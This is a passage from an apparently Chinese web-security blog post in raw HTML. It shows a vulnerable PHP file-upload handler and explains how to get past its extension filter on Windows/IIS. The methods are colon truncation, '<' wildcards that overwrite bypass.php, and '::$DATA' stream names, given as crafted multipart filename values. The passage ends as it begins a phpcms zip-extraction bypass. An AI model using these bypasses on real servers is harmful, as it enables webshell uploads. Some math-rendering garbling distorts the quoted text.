class=&#34;variable&#34;&gt;$upfile&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];    &lt;span class=&#34;comment&#34;&gt;//file中name&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$upfile&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$upfile&lt;/span&gt;);   &lt;span class=&#34;comment&#34;&gt;//过滤; 防止截断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$upfile&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/[^(\w|\:|\$|\.|\&amp;lt;|\&amp;gt;)]/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$upfile&lt;/span&gt;);   &lt;span class=&#34;comment&#34;&gt;//只能出现a-zA-Z0-9:$.&amp;lt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$tempfile&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;get_extension&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$upfile&lt;/span&gt;)); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;,&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;php3&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;php5&amp;#x27;&lt;/span&gt;)))&amp;#123;   &lt;span class=&#34;comment&#34;&gt;//过滤php35&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Warning ! File type error..&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;asp&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;asa&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;cer&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;cdx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;aspx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;htaccess&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;//$savefile = &amp;#x27;upload/&amp;#x27;.$upfile;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$savefile&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;upload/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$tempfile&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$savefile&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Success upload..path :&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$savefile&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Upload failed..&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;get_extension&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;strtolower&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;, &lt;span class=&#34;title function_ invoke__&#34;&gt;strrpos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;form method=&lt;span class=&#34;string&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; action=&lt;span class=&#34;string&#34;&gt;&amp;quot;upfile.php&amp;quot;&lt;/span&gt; enctype=&lt;span class=&#34;string&#34;&gt;&amp;quot;multipart/form-data&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;input type=&lt;span class=&#34;string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt; name=&lt;span class=&#34;string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt; value=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;input type=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; name=&lt;span class=&#34;string&#34;&gt;&amp;quot;filename&amp;quot;&lt;/span&gt; value=&lt;span class=&#34;string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;lt;input type=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; name=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; value=&lt;span class=&#34;string&#34;&gt;&amp;quot;upload&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;前置知识 1.&lt;/p&gt;
&lt;p&gt;php 可以使用 &lt;code&gt;%00&lt;/code&gt;  截断，也可以使用 &lt;code&gt;:&lt;/code&gt;  截断，但：截断后文件内容是空的&lt;/p&gt;
&lt;p&gt;(我看人家说用 #? 这两个字符也能截断… 我觉得不太对)&lt;/p&gt;
&lt;p&gt;前置知识 2.&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;Windows&lt;/span&gt;+&lt;span class=&#34;variable constant_&#34;&gt;IIS&lt;/span&gt;+&lt;span class=&#34;variable constant_&#34;&gt;PHP&lt;/span&gt;下&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;双引号(&lt;span class=&#34;string&#34;&gt;&amp;quot;“&amp;quot;&lt;/span&gt;) &amp;lt;==&amp;gt; 点号(&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;)&lt;span class=&#34;string&#34;&gt;&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;大于符号(&amp;quot;&amp;gt;&amp;quot;) &amp;lt;==&amp;gt; 问号(&amp;quot;?&amp;quot;)&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;小于符号(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;) &amp;lt;==&amp;gt; 星号(&lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;)&lt;span class=&#34;string&#34;&gt;&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;上述是等价的，但*又可以做通配符使用，因此我们可以使用&amp;lt;作为通配符&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;利用覆盖生成文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用覆盖生成文件&#34;&gt;#&lt;/a&gt; 利用：覆盖生成文件&lt;/h3&gt;
&lt;p&gt;先安装 IIS 和对应的管理工具&lt;/p&gt;
&lt;p&gt;1) 首先利用冒号生成我们将要覆盖的 php 文件，这里为：bypass.php，抓包将其改为 bypass.php:jpg&lt;/p&gt;
&lt;p&gt;此时会覆盖文件，文件上传后的文件名为 bypass.php，大小为 0kb&lt;/p&gt;
&lt;p&gt;2) 利用上面的系统特性覆盖该文件&lt;/p&gt;
&lt;p&gt;从上面已经知道 &amp;quot;&amp;lt;&amp;quot; 就等于 “ &lt;code&gt;*&lt;/code&gt; ”, 而 &amp;quot; &lt;code&gt;*&lt;/code&gt; &amp;quot; 代码任意字符，于是乎… 我们可以这样修改上传的文件名&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;------&lt;span class=&#34;title class_&#34;&gt;WebKitFormBoundaryaaRARrn2LBvpvcwK&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;title class_&#34;&gt;Disposition&lt;/span&gt;: form-data; name=&lt;span class=&#34;string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;; filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;bypass.&amp;lt;&amp;lt;&amp;lt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;title class_&#34;&gt;Type&lt;/span&gt;: image/jpeg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时即可覆盖 bypass.php，同时文件内容被成功写了进去，后面就可以在内容中写 php 代码&lt;/p&gt;
&lt;h3 id=&#34;通过默认数据流上传php文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过默认数据流上传php文件&#34;&gt;#&lt;/a&gt; 通过默认数据流上传 php 文件&lt;/h3&gt;
&lt;p&gt;抓包，修改文件名，在结尾添加::$DATA&lt;/p&gt;
&lt;p&gt;The default data stream has no name. That is, the fully qualified name for the default stream for a file called “sample.txt” is “sample.txt::&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;DATA&amp;quot; since &amp;quot;sample.txt&amp;quot; is the name of the file and &amp;quot;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;DATA” is the stream type&lt;/p&gt;
&lt;p&gt;默认数据流没有名称。也就是说，名为 “sample.txt” 的文件的默认流的完全限定名是 “sample.txt:：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mtext&gt;”，因为“&lt;/mtext&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mtext&gt;”是文件名，“&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;DATA”，因为“sample.txt”是文件名，“&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;”&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;因&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;为&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;“&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;”&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;文&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;件&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;名&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;“&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;DATA” 是流类型&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;------&lt;span class=&#34;title class_&#34;&gt;WebKitFormBoundaryaaRARrn2LBvpvcwK&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;title class_&#34;&gt;Disposition&lt;/span&gt;: form-data; name=&lt;span class=&#34;string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;; filename=&lt;span class=&#34;string&#34;&gt;&amp;#x27;DataStreamTest.php::$DATA&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;Content&lt;/span&gt;-&lt;span class=&#34;title class_&#34;&gt;Type&lt;/span&gt;: image/jpeg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功上传后缀为 php 的文件&lt;/p&gt;
&lt;h2 id=&#34;phpcms文件上传四次绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpcms文件上传四次绕过&#34;&gt;#&lt;/a&gt; phpcms 文件上传四次绕过&lt;/h2&gt;
&lt;p&gt;1. 只能上传压缩文件，上传后解压，判断文件后缀，删除非法文件&lt;/p&gt;
&lt;p&gt;没有递归删除文件，导致可以构造文件夹，文件夹中放非法文件&lt;/p&gt;
